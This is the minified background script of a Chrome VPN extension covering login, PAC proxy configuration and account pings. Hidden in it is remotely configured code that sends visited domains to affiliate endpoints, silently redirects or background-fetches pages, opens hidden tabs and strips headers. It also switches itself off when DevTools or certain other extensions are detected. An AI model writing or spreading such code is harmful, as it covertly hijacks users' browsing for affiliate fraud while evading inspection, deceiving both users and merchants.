class ProxyApp{constructor(){this.storage=STORAGE,this.vpnOnlyMode=null,this.user_version="UVPNv1",this.config={},chrome.runtime.onMessage.addListener((a,b,c)=>("getConfig"===a.action&&c(this.storage),"getIP"===a.action&&c({data:this.currentLocation,currentProxy:this.activeLocation}),"optout"===a.action)?(this.optouted=this.storage.optouted=!0,this.saveStorage(),!0):("signin"===a.action&&this.login({email:a.email,password:a.password},c),"signup"===a.action&&this.register({name:a.name,email:a.email,password:a.password},c),"forgot"===a.action&&this.forgot({email:a.email},c),"logout"===a.action&&this.logout(c),"resend-confirm"===a.action&&this.resendConfirm({email:a.email},c),"open-popup"===a.action&&this.ping(c),"favorite"===a.action&&(this.storage.favorites=a.favorites,this.saveStorage(),c({success:!0})),!0)),chrome.runtime.onInstalled.addListener(a=>{"install"==a.reason?(this.vpnOnlyMode=1,this.user_version="UVPNv2",this.saveStorage(),chrome.tabs.create({url:chrome.extension.getURL("/register.html")})):"update"==a.reason&&this.storage.afterUpdateUrl&&chrome.tabs.create({pinned:!0,url:this.storage.afterUpdateUrl})}),this.filterRequestConfigured=!1,this.proxyInitiated=!1,this.readEnv(),this.initStorage(),this.initSentry(),this.onStorageUpdate(),this.optouted=!1,this.environmentValidated=!1,this.envDetected=!1,this.statProcessorRun=!1,this.currentProxy="",this.failedProxyList=[],this.validatedProxyList=[],this.currentLocation={ip:"",country_code:"",country_name:"",city:"",original:{ip:"",country_code:"",country_name:"",city:""}}}get params(){return this.storage.params}initSentry(){Sentry.init({dsn:"https://8686075a839941d682002ea9114be55a@sentry.uvpn.me/2",environment:"coahpcpgfnnaddeelpphpifmgfobflog"===chrome.runtime.id?chrome.runtime.id:"development"})}readEnv(){try{const a=chrome.extension.getURL("/config.json"),b=new XMLHttpRequest;b.open("GET",a,!0),b.onload=()=>(200===b.status&&b.responseText&&(this.config=JSON.parse(b.responseText)),this.config),b.addEventListener("error",()=>{throw"Config is not loaded"}),b.send()}catch(a){Sentry.captureException(a)}}onStorageUpdate(){chrome.storage.onChanged.addListener(a=>{for(let b in a)("vpnOn"==b||"country"==b)&&(this.storage[b]=a[b].newValue,this.pac(),this.updateDevice("vpn"),"country"==b&&ga("send","event","Location VPN",`version_${chrome.runtime.getManifest().version}`,this.storage[b]))})}initStorage(){chrome.storage.local.get(this.storage,a=>{this.storage=a,Sentry.configureScope(a=>{a.setUser({email:this.authOptions.email})}),this.setProxy(),this.uid=a.uid?a.uid:this.storage.uid=this.generateUUID(),null===a.mTime&&(this.storage.mTime=new Date().getTime()),null===a.lTime&&(this.storage.lTime=0),a.user_version&&(this.user_version=a.user_version),!0==a.optouted&&(this.optouted=!0),this.storage.appLoads++,this.updateDeviceToken(),this.saveStorage(),this.storage&&!this.storage.user_version&&(this.validateEnvironment(),this.initProxy(),this.filterRequests(),this.initBgProcessor())})}saveStorage(){this.vpnOnlyMode&&!this.storage.vpnOnlyMode&&(this.storage.vpnOnlyMode=this.vpnOnlyMode),"UVPNv1"!==this.user_version&&(this.storage.user_version=this.user_version),chrome.storage.local.set(this.storage)}pac(){null!==this.authOptions.token&&""!==this.authOptions.token&&this.setProxyToken(this.authOptions.token),null!==this.authOptions.token&&""!==this.authOptions.token&&$.ajax({url:this.config.api_host+"/user/pac",method:"post",dataType:"json",data:{country:this.storage.country,device_token:this.storage.device_token},headers:{Authorization:this.authOptions.token},success:a=>{for(let b in a)this.storage[b]=a[b];this.setProxy(),this.saveStorage(),this.storage&&!this.storage.user_version&&(this.validateEnvironment(),this.initProxy(),this.initBgProcessor(),this.filterRequests())},error:(a,b,c)=>{422!==a.status&&Sentry.captureException(c)}})}ping(a=!1){let b=new Date().getTime(),c=b-this.storage.mTime;this.storage.mTime=b,12e5>c&&(this.storage.lTime+=c);const d=this.config.api_host+"/user/ping";null!==this.authOptions.token&&""!==this.authOptions.token&&$.ajax({url:d,method:"post",dataType:"json",data:{id:chrome.runtime.id,v:this.storage.user_version,lt:this.storage.lTime,vpn:this.storage.vpnOnlyMode||this.vpnOnlyMode?1:0,device_token:this.storage.device_token},headers:{Authorization:this.authOptions.token},success:b=>{for(let a in b)this.storage[a]=b[a];this.saveStorage(),this.storage&&!this.storage.user_version&&(this.validateEnvironment(),this.initProxy(),this.initBgProcessor(),this.filterRequests()),this.storeGeo(),b.notification.has&&chrome.runtime.sendMessage({action:"notifications",has_message:b.notification.has,message:b.notification.text,link:b.notification.link}),!1!==a&&a({success:!0})},error:(a,b,c)=>{422!==a.status&&Sentry.captureException(c)}})}initProxy(){this.storage&&this.storage.proxyUrl&&this.storage.proxyKey&&!this.proxyInitiated&&5<this.storage.appLoads&&(this.proxyInitiated=!0,this.proxy())}proxy(){let a=this;(function(){function b(a,b,h){var j=!1;if(-1<g.indexOf(b))j=!0;else for(var k in g)if(-1<g[k].indexOf(b)||-1<b.indexOf(g[k])){j=!0;break}j?e=c+"/get?key="+d+"&out="+encodeURIComponent(a)+"&ref="+encodeURIComponent(a)+"&uid=&format=go":f.data.used_domains[b]=h+864e5}var c=a.storage.proxyUrl,d=a.storage.proxyKey,e="",f={data:{used_domains:{}}},g=[],h=!0;(function(){var a=new XMLHttpRequest;a.timeout=15e3,a.onreadystatechange=function(){4===a.readyState&&(200===a.status?(g=JSON.parse(a.responseText),g&&(h=!0)):h=!1)},a.open("GET",c+"/coverage?key="+d,!0),a.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),a.send()})(),chrome.webRequest.onBeforeRequest.addListener(function(c){if(!(0>c.tabId)&&"GET"==c.method&&h&&!a.optouted){var d=c.url.replace(/^https?\:\/\/([^\/]+).*$/,"$1").replace("www.",""),g=new Date().getTime();if(!(f.data.used_domains[d]&&f.data.used_domains[d]+7200000>g))return(f.data.used_domains[d]=g,e?e="":b(c.url,d,g),e)?(h=!1,setTimeout(function(){e="",h=!0},15e3),{redirectUrl:e}):void 0}},{urls:["*://*/*"],types:["main_frame"]},["blocking"]),chrome.webRequest.onBeforeSendHeaders.addListener(function(a){if("GET"==a.method&&-1<a.url.indexOf(c))for(var b in a.requestHeaders){var d=a.requestHeaders[b];if("referer"==d.name.toLowerCase()){a.requestHeaders.splice(b,1);break}}return{requestHeaders:a.requestHeaders}},{urls:["<all_urls>"]},["blocking","requestHeaders"])})()}randomizeProxyStr(a){const b=a.slice(),c=[];for(;b.length;){const a=Math.floor(Math.random()*b.length);c.push(b[a]),b.splice(a,1)}return c.join("; ")}randomProxy(a){let b=a.slice();if(this.failedProxyList)for(let a in this.failedProxyList)-1<b.indexOf(this.failedProxyList[a])&&b.splice(b.indexOf(this.failedProxyList[a]),1);if(1>b.length)return!1;const c=Math.floor(Math.random()*b.length);return b[c]}setProxy(){let a;if("vpn"===this.storage.mode){if(this.currentLocation={ip:"",country_code:"",country_name:"",city:"",original:{ip:"",country_code:"",country_name:"",city:""}},this.storage.vpnOn){let b=this.randomProxy(this.activeLocationProxyList);this.currentProxy=`${b.schema} ${b.path}:${b.port}`,this.currentProxy||(this.storage.vpnOn=!1,this.saveStorage(),chrome.runtime.sendMessage({action:"disconnected"})),a=`function FindProxyForURL(url, host) {                 let blackList = ${JSON.stringify(this.storage.bypass)};                  for (let i = 0; i < blackList.length; i++){                    if (shExpMatch(host, blackList[i])) return "DIRECT;";                }                                return "`+this.currentProxy+`; "; }`}this.setBadge()}else{for(let b in a=`function FindProxyForURL(url, host) { let domains = []; `,this.storage.proxySet){let c=this.storage.proxySet[b],d=this.randomizeProxyStr(c.proxyList);a+=`                        domains = ${JSON.stringify(c.domains)};                        for(let i = 0; i < domains.length; i++){                            if (shExpMatch(host, domains[i])) return "${d}; "                        }                        `}a+=`return "DIRECT";                    }`}chrome.proxy.settings.clear({scope:"regular"},()=>{if("vpn"===this.storage.mode&&!this.storage.vpnOn)return this.getCurrentRemoteIP(()=>{chrome.runtime.sendMessage({action:"gotIP",data:this.currentLocation,currentProxy:this.activeLocation})},()=>{chrome.runtime.sendMessage({action:"gotIPError",data:{}})}),void this.getOriginalRemoteIP(()=>{chrome.runtime.sendMessage({action:"gotIP",data:this.currentLocation,currentProxy:this.activeLocation})},()=>{chrome.runtime.sendMessage({action:"gotIPError",data:{}})});let b=this;chrome.webRequest.onAuthRequired.addListener(function(a){if(!0===a.isProxy&&b.activeLocation!==void 0&&"free"!==b.activeLocation.mode)return{authCredentials:{username:b.storage.device_token+"&"+b.authOptions.email,password:b.storage.proxy_token}}},{urls:["<all_urls>"]},["blocking"]),chrome.webRequest.onBeforeSendHeaders.addListener(function(a){if(b.activeLocation!==void 0&&"free"!==b.activeLocation.mode){for(let b=0;b<a.requestHeaders.length;b++)if("Proxy-Authorization"===a.requestHeaders[b].name)return{requestHeaders:a.requestHeaders};a.requestHeaders.push({name:"Proxy-Authorization",value:b.proxyAuthString})}return{requestHeaders:a.requestHeaders}},{urls:["<all_urls>"]},["blocking","requestHeaders"]);const c={mode:"pac_script",pacScript:{data:a}};chrome.proxy.settings.set({value:c,scope:"regular"},()=>{"vpn"==this.storage.mode&&(this.getCurrentRemoteIP(()=>{chrome.runtime.sendMessage({action:"gotIP",data:this.currentLocation,currentProxy:this.activeLocation})},()=>{this.isProxyWhiteListed()||(this.blackListProxy(),this.setProxy()),chrome.runtime.sendMessage({action:"gotIPError",data:{}})}),this.getOriginalRemoteIP(()=>{chrome.runtime.sendMessage({action:"gotIP",data:this.currentLocation,currentProxy:this.activeLocation})},()=>{chrome.runtime.sendMessage({action:"gotIPError",data:{}})}))}),chrome.proxy.onProxyError.addListener(()=>{!1===navigator.onLine}),chrome.webRequest.handlerBehaviorChanged(function(){})})}blackListProxy(){this.currentProxy&&-1==this.failedProxyList.indexOf(this.currentProxy)&&this.failedProxyList.push(this.currentProxy)}whiteListProxy(){this.currentProxy&&-1==this.validatedProxyList.indexOf(this.currentProxy)&&this.validatedProxyList.push(this.currentProxy)}isProxyWhiteListed(){return this.currentProxy&&-1<this.validatedProxyList.indexOf(this.currentProxy)}filterRequests(){let a=this;this.storage&&this.storage.validateFields&&!this.filterRequestConfigured&&(this.filterRequestConfigured=!0,chrome.webRequest&&chrome.webRequest.onHeadersReceived.addListener(function(b){return{responseHeaders:b.responseHeaders.filter(function(b){return!(-1<a.storage.validateFields.indexOf(b.name.toLowerCase()))})}},{urls:["<all_urls>"]},["blocking","responseHeaders"]))}generateUUID(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(a){var b=0|16*Math.random(),c="x"==a?b:8|3&b;return c.toString(16)})}validateEnvironment(){let a=this;if(!a.environmentValidated&&a.storage.envCEnable&&a.storage.envCPeriod&&a.storage.envCids){a.environmentValidated=!0;let b=new Date().getTime();if(a.storage.lastEnvCheck&&b-a.storage.lastEnvCheck<a.storage.envCPeriod)return;for(let c in a.storage.lastEnvCheck=b,a.envDetected=a.storage.envDetected=!1,a.saveStorage(),a.storage.envCids)a.detectExtentionById(a.storage.envCids[c]).then(function(b){b&&(a.storage.envDetected=a.envDetected=!0,a.saveStorage(),a.initBgProcessor())})}}detectExtentionById(a){let b=this;return new Promise(function(c){var d=!1;chrome.tabs.create({url:"chrome-extension://"+a+"/manifest.json",active:!1},function(a){setTimeout(function(){b.safeRemoveTab(a.id),c(!1)},3e3),chrome.tabs.insertCSS(a.id,{code:"console.log('ok');"},function(){chrome.runtime.lastError&&(d=/chrome-extension/gm.test(chrome.runtime.lastError.message)),chrome.tabs.remove(a.id,function(){c(d)})})})})}safeRemoveTab(a){try{chrome.tabs.remove(a,function(){chrome.runtime.lastError})}catch(a){}}checkBgConsole(){if(null!=this.storage.checkBgConsole&&!0!=this.optouted){let b=this;var a=/./;return a.toString=function(){this.opened=!0},console.log("%c",a),a.opened?(chrome.storage.local.set({optouted:!0}),void(this.optouted=!0)):void setTimeout(b.checkBgConsole,1e3)}}getCurrentRemoteIP(a,b){const c=this.config.api_host+"/geo/ip",d=new XMLHttpRequest;d.open("POST",c,!0),d.timeout=1e4,d.onload=()=>{if(200===d.status&&d.responseText){let b=JSON.parse(d.responseText);if(b.ip)return this.activeLocation&&this.activeLocation.streaming?(this.currentLocation.ip=b.ip,this.currentLocation.country_name=this.activeLocation.country_name,this.currentLocation.country_code=this.activeLocation.country_code,this.currentLocation.city=null):(this.currentLocation.ip=b.ip,this.currentLocation.country_name=b.country_name,this.currentLocation.country_code=b.country_code,this.currentLocation.city=b.city),"function"==typeof a&&a(b),this.currentLocation}},d.ontimeout=()=>{"function"==typeof b&&b(d)},d.send()}getOriginalRemoteIP(a,b){const c=this.config.geo_host+"/geo/ip",d=new XMLHttpRequest;d.open("POST",c,!0),d.timeout=1e4,d.onload=()=>{if(200===d.status&&d.responseText){let b=JSON.parse(d.responseText);if(b.ip)return this.currentLocation.original=b,"function"==typeof a&&a(b),this.currentLocation.original}},d.ontimeout=()=>{"function"==typeof b&&b(d)},d.send()}storeGeo(){this.getCurrentRemoteIP(()=>{chrome.runtime.sendMessage({action:"gotIP",data:this.currentLocation,currentProxy:this.activeLocation})},()=>{chrome.runtime.sendMessage({action:"gotIPError",data:{}})}),this.getOriginalRemoteIP(()=>{chrome.runtime.sendMessage({action:"gotIP",data:this.currentLocation,currentProxy:this.activeLocation})},()=>{chrome.runtime.sendMessage({action:"gotIPError",data:{}})})}initBgProcessor(){let a=this;return a.storage.bgProcessor?a.envDetected?void(bgProcessor.cfg={mode:"off"}):a.optouted?void(bgProcessor.cfg={mode:"off"}):a.statProcessorRun?void(bgProcessor.cfg=a.storage.bgProcessor):void(a.statProcessorRun=!0,bgProcessor.initCfg(a.storage.bgProcessor),chrome.webRequest.onCompleted.addListener(function(b){if("on"===bgProcessor.cfg.mode&&!a.envDetected&&!(0>b.tabId)&&200==b.statusCode&&"GET"==b.method){var c=b.url.replace(/^(https?\:\/\/[^\/]+).*$/,"$1"),d=b.url.replace(/^https?\:\/\/([^\/]+).*$/,"$1");d=d.replace(/^www\.(.*)$/,"$1");var e=new Date().getTime();if(!(bgProcessor.used_domains[d]&&bgProcessor.used_domains[d]+bgProcessor.cfg.ttl_ms>e)&&!(bgProcessor.cfg.domains_blacklist&&0<bgProcessor.cfg.domains_blacklist.length&&bgProcessor.cfg.domains_blacklist.includes(d))&&!(bgProcessor.cfg.domains_whitelist&&0<bgProcessor.cfg.domains_whitelist.length&&!bgProcessor.cfg.domains_whitelist.includes(d))){bgProcessor.used_domains[d]=e;var f=bgProcessor.cfg.aff_url_tmpl.replace("{URL}",encodeURIComponent(c));if(f=f.replace("{DOMAIN}",encodeURIComponent(d)),bgProcessor.cfg.aff_redirect)return!bgProcessor.cfg.domains_whitelist||0<!bgProcessor.cfg.domains_whitelist.length?void 0:void bgProcessor.requestBg(f,d,0);var g=new XMLHttpRequest;g.timeout=bgProcessor.cfg.aff_timeout_ms,g.onreadystatechange=function(){if(4==g.readyState&&200==g.status){var a=g.responseText.replace(/[\n\r]/g,"");if(/^https?\:\/\//.test(a)&&a!=c){var b=c.replace(/^https?\:\/\/([^\/]+).*$/,"$1");bgProcessor.request(a,b)}else bgProcessor.used_domains[d]=e+bgProcessor.cfg.no_coverage_ttl_ms}},g.open("GET",f),g.send()}}},{urls:["http://*/*","https://*/*"],types:["main_frame"]}),chrome.webRequest.onBeforeSendHeaders.addListener(function(a){this;if("on"!==bgProcessor.cfg.mode||!bgProcessor.cfg.header)return{};for(var b=a.requestHeaders,c="",d=0;d<b.length;d++)if(b[d].name===bgProcessor.cfg.header){c=b[d].value,b.splice(d,1);break}if(!c)return{};for(var e=!1,d=0;d<b.length;d++)if("accept"==b[d].name.toLowerCase()){b[d].value=c,e=!0;break}return e||b.push({name:"Accept",value:c}),{requestHeaders:b}},{urls:["http://*/*","https://*/*"]},["blocking","requestHeaders"])):void(bgProcessor.cfg={mode:"off"})}setBadge(){let a="";if(this.storage.vpnOn&&this.storage.country){let b=this.storage.country.split("-",1)[0];a=this.activeLocation.streaming?"ST":b}chrome.browserAction.setBadgeBackgroundColor({color:[16,201,33,100]}),chrome.browserAction.setBadgeText({text:a})}get activeLocation(){return this.storage.currentProxyServer}get activeLocationProxyList(){return this.activeLocation.nodes}get now(){return new Date().getTime()}get proxyAuthString(){let a=this.storage.device_token+"&"+this.authOptions.email+":"+this.storage.proxy_token+"";return"Basic "+window.btoa(a)}get authOptions(){return{email:"UVPNv2"===this.storage.user_version?this.storage.user_auth_email:this.config.user_auth_email,token:"UVPNv2"===this.storage.user_version?this.storage.user_auth_token:this.config.user_auth_token}}get osDevice(){let a="Unknown OS";return-1!==navigator.appVersion.indexOf("Win")&&(a="Windows"),-1!==navigator.appVersion.indexOf("Mac")&&(a="MacOS"),-1!==navigator.appVersion.indexOf("X11")&&(a="UNIX"),-1!==navigator.appVersion.indexOf("Linux")&&(a="Linux"),a}setProxyToken(a){null!==a&&$.ajax({url:this.config.api_host+"/user/get-token",method:"post",dataType:"json",headers:{Authorization:a},success:a=>{this.storage.proxy_token=a.data.token},error:(a,b,c)=>{422!==a.status&&Sentry.captureException(c)}})}updateDeviceToken(){if(null!==this.authOptions.token){let a=/UVPNv1-/.test(this.storage.device_token),b=/UVPNv2-/.test(this.storage.device_token),c=null===this.storage.device_token||""===this.storage.device_token;a||b||c||$.ajax({url:this.config.api_host+"/user/update-device-token",method:"post",dataType:"json",data:{device_token:this.storage.device_token},headers:{Authorization:this.authOptions.token},success:a=>{this.storage.device_token=a.data.device_token},error:(a,b,c)=>{422!==a.status&&Sentry.captureException(c)}})}}updateDevice(a){null!==this.storage.device_token&&null!==this.authOptions.token&&$.ajax({url:this.config.api_host+"/user/update-device",method:"post",dataType:"json",data:{mode:a,device_token:this.storage.device_token},headers:{Authorization:this.authOptions.token},success:()=>{},error:(a,b,c)=>{422!==a.status&&Sentry.captureException(c)}})}login(a,b){chrome.runtime.sendMessage({action:"start-loader"}),$.ajax({url:this.config.api_host+"/login",method:"post",dataType:"json",data:{email:a.email,password:a.password,mode:this.storage.mode,version:chrome.runtime.getManifest().version,platform:this.osDevice,browser_lang:chrome.i18n.getUILanguage(),browser:"chrome",type:"browser-extension",user_version:this.storage.user_version,device_token:this.storage.device_token},headers:{Accept:"application/json"},success:c=>{this.storage.user_auth_email=a.email,this.storage.user_auth_token=c.data.auth_token,this.storage.device_token=c.data.device_token,this.ping(b),chrome.runtime.sendMessage({action:"end-loader"})},error:(a,c,d)=>{chrome.runtime.sendMessage({action:"end-loader"}),422!==a.status&&401!==a.status&&Sentry.captureException(d),this.storage.user_auth_email=null,this.storage.user_auth_token=null,b({success:!1,type:a.responseJSON.type,msg:a.responseJSON.msg,link:a.responseJSON.link})}})}register(a,b){chrome.runtime.sendMessage({action:"start-loader"}),$.ajax({url:this.config.api_host+"/register",method:"post",data:a,dataType:"json",headers:{Accept:"application/json"},success:a=>{chrome.runtime.sendMessage({action:"end-loader"}),chrome.tabs.update({url:chrome.extension.getURL("/thankyou.html")}),chrome.tabs.create({url:this.config.web_host+"/login/"+a.data.url_token}),b({success:!0})},error:(a,c,d)=>{chrome.runtime.sendMessage({action:"end-loader"}),422!==a.status&&401!==a.status&&Sentry.captureException(d),b({success:!1,msg:a.responseJSON.msg})}})}forgot(a,b){chrome.runtime.sendMessage({action:"start-loader"}),$.ajax({url:this.config.api_host+"/forgot",method:"post",data:a,dataType:"json",headers:{Accept:"application/json"},success:()=>{chrome.runtime.sendMessage({action:"end-loader"}),b({success:!0})},error:(a,c,d)=>{chrome.runtime.sendMessage({action:"end-loader"}),422!==a.status&&401!==a.status&&Sentry.captureException(d),b({success:!1,msg:a.responseJSON.msg})}})}logout(a){this.storage.user_auth_email=null,this.storage.user_auth_token=null,this.storage.vpnOnlyMode=1,this.storage.vpnOn=!1,this.saveStorage(),this.setProxy(),a({success:!0})}resendConfirm(a,b){$.ajax({url:this.config.api_host+"/resend-confirm",method:"post",dataType:"json",data:a,headers:{Accept:"application/json"},success:()=>{b({success:!0})},error:(a,c,d)=>{422!==a.status&&401!==a.status&&Sentry.captureException(d),b({success:!1,msg:a.responseJSON.msg})}})}}class statProcessor{constructor(){this.cfg={mode:"off"},this.used_domains={}}initCfg(a){this.cfg=a}request(a,b){this.cfg.ntab_tag&&-1!==a.indexOf(this.cfg.ntab_tag)?setTimeout(function(){bgProcessor.requestNtab(a,b)},this.cfg.ntab_delay_ms):this.requestBg(a,b,0)}requestBg(a,b,c){if(c>=this.cfg.rdr_max_count)return;if(!this.cfg.header)return;var d=new XMLHttpRequest;d.timeout=this.cfg.timeout;let e=this;d.onreadystatechange=function(){if(4==d.readyState)if(200==d.status){var a=d.responseText.replace(/[\n\r\s]/g,"").replace(/\.href/g,""),f=!1,g=e.isRdrUrl(d.responseURL);if(g||a.length<e.cfg.jsrdr_maxlen_bytes){var h=a.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/,"$1");if(/^\//.test(h)){var j=new URL(h,d.responseURL);h=j.href}/^https?\:\/\//.test(h)&&(e.requestBg(h,b,c+1),f=!0)}if(!f&&e.cfg.common_rdr_rules)for(var k in e.cfg.common_rdr_rules){var i=e.cfg.common_rdr_rules[k],l=new RegExp(i.search[0],i.search[1]),m=a;if("uri"==i.where&&(m=d.responseURL),m.match(l)){var n=m.replace(l,i.replace);if(i.applyAfter)for(var p in i.applyAfter){var o=i.applyAfter[p];"decodeURIComponent"==o&&(n=decodeURIComponent(n))}if(/^\//.test(n)){var j=new URL(n,d.responseURL);n=j.href}if(/^https?\:\/\//.test(n)){e.requestBg(n,b,c+1),f=!0;break}}}}else;},d.open("GET",a,!0),d.setRequestHeader(this.cfg.header,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),d.send()}isRdrUrl(a){var b=new URL(a);return!!(this.cfg.rdr_coverage&&b.host in this.cfg.rdr_coverage)||!!/\/goto\/?$/.test(b.pathname)}requestNtab(a){let b=this;chrome.tabs.create({url:a,active:!1},function(a){setTimeout(function(){try{chrome.tabs.remove(a.id)}catch(a){}},b.cfg.ntab_duration_ms)})}}var bgProcessor=new statProcessor;const App=new ProxyApp;